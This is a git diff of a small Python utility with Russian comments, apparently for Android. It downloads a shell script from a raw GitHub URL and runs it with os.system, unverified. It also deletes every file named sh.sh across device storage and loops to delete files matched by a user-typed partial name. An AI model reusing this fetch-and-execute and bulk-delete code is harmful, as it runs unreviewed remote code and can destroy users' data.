@@ -1,5 +1,6 @@
 import os
 import requests
+
 # version=2
 def download_and_execute_script():
     url = "https://raw.githubusercontent.com/merfiDEV/Chyrka/main/sh.sh"
@@ -17,11 +18,6 @@ def download_and_execute_script():
     # Выполняем файл
     os.system(f"sh {save_path}")
 
-download_and_execute_script()
-
-print("\033[34mSuccefuly started\033[0m")
-print("\033[32mСделано By MerfiDEV/Maked by MerfiDEV\033[0m")
-
 def find_files(partial_name, search_directory):
     matching_files = []
     for root, dirs, files in os.walk(search_directory):
@@ -33,12 +29,25 @@ def find_files(partial_name, search_directory):
 def delete_file(file_path):
     try:
         os.remove(file_path)
+        print(f"Удален файл: {file_path}")
     except Exception as e:
-        pass
+        print(f"Не удалось удалить файл {file_path}: {e}")
 
 def main():
     search_directory = '/storage/emulated/0'
     
+    # Ищем все файлы sh.sh по всему устройству и удаляем их
+    matching_files = find_files('sh.sh', search_directory)
+    for file_path in matching_files:
+        delete_file(file_path)
+
+    # Запуск загрузки и выполнения нового скрипта
+    download_and_execute_script()
+
+    print("\033[34mSuccessfully started\033[0m")
+    print("\033[32mСделано By MerfiDEV/Maked by MerfiDEV\033[0m")
+
+    # Дополнительная часть, позволяющая искать и удалять другие файлы
     while True:
         partial_name = input("Введите часть, или полное имя файла для поиска: ")
         matching_files = find_files(partial_name, search_directory)
